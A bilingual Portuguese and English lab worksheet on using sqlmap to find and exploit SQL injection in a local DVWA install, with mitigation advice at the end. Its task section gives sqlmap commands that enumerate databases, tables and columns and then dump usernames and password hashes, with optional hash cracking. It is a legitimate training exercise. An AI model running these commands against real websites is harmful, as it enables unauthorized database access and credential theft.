# Teste de Injeção SQL com sqlmap / SQL Injection Testing with sqlmap

> **AVISO / WARNING**
> Executar apenas em ambiente de laboratório isolado (DVWA local) e com autorização. O uso em sistemas de terceiros sem permissão é crime.
> Run only in an isolated lab environment (local DVWA) with authorization. Using it on third-party systems without permission is a crime.

## PORTUGUÊS

### 1. Objetivo
Utilizar o sqlmap para detetar e explorar vulnerabilidades de injeção SQL numa aplicação web de laboratório (DVWA), extraindo nomes de bases de dados, tabelas, colunas e dados.

### 2. Ferramentas
- Kali Linux (versão atual)
- sqlmap (já incluído no Kali, ou instalado via `sudo apt install sqlmap`)
- DVWA (Damn Vulnerable Web Application), instalado via `sudo apt install dvwa`
- Navegador web

### 3. Introdução
O sqlmap é uma ferramenta open-source de automação de deteção e exploração de injeção SQL. Suporta múltiplos sistemas de gestão de bases de dados (MySQL, PostgreSQL, MSSQL, Oracle, SQLite, etc.) e permite extrair dados, aceder ao sistema de ficheiros e executar comandos, dependendo dos privilégios da base de dados. O DVWA é uma aplicação PHP/MySQL deliberadamente vulnerável, mantida atualmente, e pode ser instalada diretamente no Kali através do gestor de pacotes.

### 4. Instalação do ambiente

**4.1 Instalar o sqlmap**
```
sudo apt update
sudo apt install sqlmap
```
Confirmar a versão:
```
sqlmap --version
```
A versão instalada via APT pode estar ligeiramente desatualizada. Para obter a versão mais recente, pode clonar o repositório Git:
```
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
cd sqlmap-dev
python sqlmap.py --version
```
Após a clonagem, pode criar um link simbólico para facilitar a utilização:
```
sudo ln -sf $(pwd)/sqlmap.py /usr/local/bin/sqlmap
```

**4.2 Instalar e iniciar o DVWA**
```
sudo apt install dvwa
```
Após a instalação, iniciar o serviço:
```
dvwa-start
```
A interface web predefinida é http://127.0.0.1:42001. O utilizador predefinido é `admin`, e a palavra-passe está em branco (premindo Enter diretamente).

Após o primeiro acesso, é necessário clicar em "Create / Reset Database" para inicializar a base de dados. Depois, fazer login com `admin` e palavra-passe vazia.

**4.3 Configurar o DVWA para o nível de segurança Low**
No DVWA, ir a "DVWA Security" e definir o nível de segurança como Low. Isto garante que o módulo SQL Injection apresenta vulnerabilidades óbvias, adequadas para demonstração.

### 5. Obter o PHPSESSID e o URL alvo
1. No DVWA, aceder à página SQL Injection.
2. Abrir as ferramentas de programador do navegador (F12), separador Network, ou utilizar uma extensão de gestão de cookies.
3. Na página, introduzir `1` no campo "Enter ID" e submeter.
4. No pedido de rede, encontrar o valor do cookie PHPSESSID (uma cadeia de 26 caracteres).
5. Registar o URL completo da página, por exemplo: `http://127.0.0.1:42001/vulnerabilities/sqli/?id=1&Submit=Submit`

### 6. Tarefas

**Tarefa 1 — Listar bases de dados**
```
sqlmap -u "http://127.0.0.1:42001/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=o_teu_valor_real; security=low" --dbs
```
Após a execução, o sqlmap deteta automaticamente o tipo de injeção e lista todas as bases de dados acessíveis. O DVWA utiliza normalmente a base de dados `dvwa`.

**Tarefa 2 — Listar tabelas**
```
sqlmap -u "http://127.0.0.1:42001/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=o_teu_valor_real; security=low" -D dvwa --tables
```
Este comando lista todas as tabelas na base de dados `dvwa`, incluindo a tabela `users`.

**Tarefa 3 — Listar colunas**
```
sqlmap -u "http://127.0.0.1:42001/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=o_teu_valor_real; security=low" -D dvwa -T users --columns
```
Este comando lista os nomes das colunas da tabela `users`, incluindo `user` e `password`.

**Tarefa 4 — Extrair dados**
```
sqlmap -u "http://127.0.0.1:42001/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=o_teu_valor_real; security=low" -D dvwa -T users -C user,password --dump
```
Este comando extrai as colunas `user` e `password` da tabela `users`. O sqlmap irá perguntar se pretende tentar decifrar os hashes, podendo escolher Y ou N conforme necessário.

**Tarefa 5 — Registar e analisar**
1. Registar os resultados de cada tarefa.
2. Comparar os diferentes níveis de segurança do DVWA (Low, Medium, High) e observar a taxa de sucesso do sqlmap.
3. Elaborar um relatório breve.

### 7. Medidas de mitigação
- Utilizar consultas parametrizadas (Prepared Statements) para prevenir injeção SQL.
- Validar e filtrar todas as entradas do utilizador no lado do servidor.
- Aplicar o princípio do menor privilégio às contas de base de dados, evitando permissões excessivas.
- Implementar WAF (Web Application Firewall) para detetar e bloquear padrões de injeção comuns.

### 8. Referências
- Kali Linux – sqlmap: https://www.kali.org/tools/sqlmap/
- Kali Linux – DVWA: https://www.kali.org/tools/dvwa/
- Repositório oficial do sqlmap: https://github.com/sqlmapproject/sqlmap
- Documentação do DVWA: https://github.com/digininja/DVWA

---

## ENGLISH

### 1. Objective
Use sqlmap to detect and exploit SQL injection vulnerabilities in a lab web application (DVWA), extracting database names, tables, columns, and data.

### 2. Tools
- Kali Linux (current version)
- sqlmap (included in Kali, or install via `sudo apt install sqlmap`)
- DVWA (Damn Vulnerable Web Application), install via `sudo apt install dvwa`
- Web browser

### 3. Introduction
sqlmap is an open-source tool that automates the detection and exploitation of SQL injection vulnerabilities. It supports multiple database management systems (MySQL, PostgreSQL, MSSQL, Oracle, SQLite, etc.) and can extract data, access the filesystem, and execute commands depending on database privileges. DVWA is a deliberately vulnerable PHP/MySQL application, actively maintained, and can be installed directly on Kali via the package manager.

### 4. Environment setup

**4.1 Install sqlmap**
```
sudo apt update
sudo apt install sqlmap
```
Verify version:
```
sqlmap --version
```
The APT version may be slightly outdated. For the latest version, clone the Git repository:
```
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
cd sqlmap-dev
python sqlmap.py --version
```
After cloning, you can create a symlink:
```
sudo ln -sf $(pwd)/sqlmap.py /usr/local/bin/sqlmap
```

**4.2 Install and start DVWA**
```
sudo apt install dvwa
```
Start the service:
```
dvwa-start
```
Default web UI: http://127.0.0.1:42001. Default user: `admin`, password: blank (press Enter).

On first access, click "Create / Reset Database" to initialize the database. Then log in with `admin` and blank password.

**4.3 Set DVWA security level to Low**
In DVWA, go to "DVWA Security" and set the security level to Low. This ensures the SQL Injection module has obvious vulnerabilities suitable for demonstration.

### 5. Obtain PHPSESSID and target URL
1. In DVWA, navigate to the SQL Injection page.
2. Open browser developer tools (F12), Network tab, or use a cookie management extension.
3. Enter `1` in the "Enter ID" field and submit.
4. In the network request, find the PHPSESSID cookie value (a 26-character string).
5. Record the full page URL, e.g., `http://127.0.0.1:42001/vulnerabilities/sqli/?id=1&Submit=Submit`

### 6. Tasks

**Task 1 — List databases**
```
sqlmap -u "http://127.0.0.1:42001/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=your_real_value; security=low" --dbs
```
sqlmap will automatically detect the injection type and list all accessible databases. DVWA typically uses the `dvwa` database.

**Task 2 — List tables**
```
sqlmap -u "http://127.0.0.1:42001/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=your_real_value; security=low" -D dvwa --tables
```
This lists all tables in the `dvwa` database, including the `users` table.

**Task 3 — List columns**
```
sqlmap -u "http://127.0.0.1:42001/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=your_real_value; security=low" -D dvwa -T users --columns
```
This lists column names in the `users` table, including `user` and `password`.

**Task 4 — Dump data**
```
sqlmap -u "http://127.0.0.1:42001/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=your_real_value; security=low" -D dvwa -T users -C user,password --dump
```
This dumps the `user` and `password` columns from the `users` table. sqlmap will ask whether to attempt hash cracking; choose Y or N as appropriate.

**Task 5 — Record and analyze**
1. Record results from each task.
2. Compare DVWA security levels (Low, Medium, High) and observe sqlmap success rates.
3. Write a short report.

### 7. Mitigation measures
- Use parameterized queries (Prepared Statements) to prevent SQL injection.
- Validate and sanitize all user input on the server side.
- Apply least privilege to database accounts, avoiding excessive permissions.
- Deploy a WAF (Web Application Firewall) to detect and block common injection patterns.

### 8. References
- Kali Linux – sqlmap: https://www.kali.org/tools/sqlmap/
- Kali Linux – DVWA: https://www.kali.org/tools/dvwa/
- Official sqlmap repository: https://github.com/sqlmapproject/sqlmap
- DVWA documentation: https://github.com/digininja/DVWA
